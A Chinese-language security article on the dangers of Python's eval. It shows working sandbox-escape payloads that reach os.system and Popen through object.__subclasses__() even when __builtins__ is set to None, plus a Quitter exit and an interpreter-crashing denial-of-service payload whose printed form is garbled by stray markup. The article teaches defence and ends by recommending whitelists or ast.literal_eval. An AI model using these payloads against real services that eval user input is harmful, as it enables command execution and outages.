# Python中eval带来的潜在风险

0x00 前言
=======

* * *

eval是Python用于执行python表达式的一个内置函数，使用eval，可以很方便的将字符串动态执行。比如下列代码：

```
>>> eval("1+2")
3
>>> eval("[x for x in range(10)]")
[0, 1, 2, 3, 4, 5, 6, 7, 8, 9]

```

当内存中的内置模块含有os的话，eval同样可以做到命令执行：

```
>>> import os
>>> eval("os.system('whoami')")
win-20140812chj\administrator
0

```

当然，eval只能执行Python的表达式类型的代码，不能直接用它进行import操作，但exec可以。如果非要使用eval进行import，则使用`__import__`：

```
>>> exec('import os')
>>> eval('import os')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1
    import os
         ^
SyntaxError: invalid syntax
>>> eval("__import__('os').system('whoami')")
win-20140812chj\administrator
0

```

在实际的代码中，往往有使用客户端数据带入eval中执行的需求。比如动态模块的引入，举个栗子，一个在线爬虫平台上爬虫可能有多个并且位于不同的模块中，服务器端但往往只需要调用用户在客户端选择的爬虫类型，并通过后端的exec或者eval进行动态调用，后端编码实现非常方便。但如果对用户的请求处理不恰当，就会造成严重的安全漏洞。

0x01 “安全”使用eval
===============

* * *

现在提倡最多的就是使用eval的后两个参数来设置函数的白名单：

Eval函数的声明为`eval(expression[, globals[, locals]])`

其中，第二三个参数分别指定能够在eval中使用的函数等，如果不指定，默认为globals()和locals()函数中 包含的模块和函数。

```
>>> import os
>>> 'os' in globals()
True
>>> eval('os.system(\'whoami\')')
win-20140812chj\administrator
0
>>> eval('os.system(\'whoami\')',{},{})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name 'os' is not defined

```

如果指定只允许调用abs函数，可以使用下面的写法：

```
>>> eval('abs(-20)',{'abs':abs},{'abs':abs})
20
>>> eval('os.system(\'whoami\')',{'abs':abs},{'abs':abs})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name 'os' is not defined
>>> eval('os.system(\'whoami\')')
win-20140812chj\administrator
0

```

使用这种方法来防护，确实可以起到一定的作用，但是，`这种处理方法可能会被绕过`，从而造成其他问题！

0x02 绕过执行代码1
============

* * *

被绕过的情景如下，小明知道了eval会带来一定的安全风险，所以使用如下的手段去防止eval执行任意代码：

```
env = {}
env["locals"]   = None
env["globals"]  = None
env["__name__"] = None
env["__file__"] = None
env["__builtins__"] = None

eval(users_str, env)

```

Python中的`__builtins__`是内置模块，用来设置内置函数的模块。比如熟悉的abs，open等内置函数，都是在该模块中以字典的方式存储的，下面两种写法是等价的：

```
>>> __builtins__.abs(-20)
20
>>> abs(-20)
20

```

我们也可以自定义内置函数，并像使用Python中的内置函数一样使用它们：

```
>>> def hello():
...     print 'shabi'
>>> __builtin__.__dict__['say_hello'] = hello
>>> say_hello()
shabi

```

小明将eval函数的作用域中的内置模块设置为`None`，好像看起来很彻底了，但依然可以被绕过。`__builtins__`是`__builtin__`的一个引用，在`__main__`模块下，两者是等价的：

```
>>> id(__builtins__)
3549136
>>> id(__builtin__)
3549136

```

根据[乌云drops](http://drops.wooyun.org/web/7490)提到的方法，使用如下代码即可：

```
[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == "zipimporter"][0]("/home/liaoxinxi/eval_test/configobj-4.4.0-py2.5.egg").load_module("configobj").os.system("uname")

```

上面的代码首先利用`__class__`和`__subclasses__`动态加载了`object`对象，这是因为eval中无法直接使用object。然后使用object的子类的zipimporter对egg压缩文件中的configobj模块进行导入，并调用其内置模块中的os模块从而实现命令执行，当然，前提是要有configobj的egg文件。 configobj模块很有意思，居然内置了os模块：

```
>>> "os" in configobj.__dict__
True
>>> import urllib
>>> "os" in urllib.__dict__
True
>>> import urllib2
>>> "os" in urllib2.__dict__
True
>>> configobj.os.system("whoami")
win-20140812chj\administrator
0

```

和configobj类似的模块如`urllib`，`urllib2`，`setuptools`等都有os的内置，理论上使用哪个都行。 如果无法下载egg压缩文件，可以下载带有setup.py的文件夹，加入：

```
from setuptools import setup, find_packages  

```

然后执行:

```
python setup.py bdist_egg

```

就可以在dist文件夹中找到对应的egg文件。 绕过demo如下：

```
>>> env = {}
>>> env["locals"]   = None
>>> env["globals"]  = None
>>> env["__name__"] = None
>>> env["__file__"] = None
>>> env["__builtins__"] = None
>>> users_str = "[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'zipimporter'][0]('E:/internships/configobj-5.0.5-py2.7.egg').load_module('configobj').os.system('whoami')"
>>> eval(users_str, env)
win-20140812chj\administrator
0
>>> eval(users_str, {}, {})
win-20140812chj\administrator
0

```

0x03 拒绝服务攻击1
============

* * *

object的子类中有很多有趣的东西，执行以下代码查看：

```
[x.__name__ for x in ().__class__.__bases__[0].__subclasses__()]

```

这里我就不输出结果了，如果你执行的话，可以看到很多有趣的模块，比如file，zipimporter，Quitter等。经过测试，file的构造函数是被解释器沙箱隔离的。 简单的，或者直接使object暴露出的子类Quitter进行退出：

```
>>> eval("[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__
 == 'Quitter'][0](0)()", {'__builtins__':None})

C:/>

```

如果运气好，遇到对方程序中导入了`os`等敏感模块，那么Popen就可以用，并且绕过`__builins__`为空的限制，栗子如下：

```
>>> import subprocess
>>> eval("[x for x in ().__class__.__bases__[0].__subclasses__() if x.__name__ == 'Popen'][0](['ping','-n','1','127.0.0.1'])",{'__builtins__':None})
<subprocess.Popen object at 0x0324FF70>
>>>
正在 Ping 127.0.0.1 具有 32 字节的数据:
来自 127.0.0.1 的回复: 字节=32 时间<1ms TTL=64
127.0.0.1 的 Ping 统计信息:
    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 (0% 丢失)，
往返行程的估计时间(以毫秒为单位):
    最短 = 0ms，最长 = 0ms，平均 = 0ms
>>>

```

事实上，这种情况非常多，比如导入os模块，一般用来处理路径问题。所以说，遇到这种情况，完全可以列举大量的功能函数，来探测目标object的子类中是否含有一些危险的函数可以直接使用。

0x04 拒绝服务攻击2
============

* * *

同样，我们甚至可以绕过`__builtins__`为None，造成一次拒绝服务攻击，Payload(来自老外blog)如下：

```
>>> eval('(lambda fc=(lambda n: [c 1="c" 2="in" 3="().__class__.__bases__[0" language="for"][/c].__subclasses__() if c.__name__ == n][0]):fc("function")(fc("code")(0,0,0,0,"KABOOM",(),(),(),"","",0,""),{})())()', {"__builtins__":None})

```

运行上面的代码，Python直接crash掉了，造成拒绝服务攻击。 原理是通过嵌套的lambda来构造一片代码段，即code对象。为这个code对象分配空的栈，并给出相应的代码字符串，这里是`KABOOM`，在空栈上执行代码，会出现crash。构造完成后，调用fc函数即可触发，其思路不可谓不淫荡。

0x05 总结
=======

* * *

从上面的内容我们可以看出，单单将内置模块置为空，是不够的，最好的机制是构造白名单，如果觉得比较麻烦，可以使用`ast.literal_eval`代替不安全的`eval`。

参考资料：
-----

【1】http://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html

【2】http://drops.wooyun.org/web/7490

【3】http://stackoverflow.com/questions/3513292/python-make-eval-safe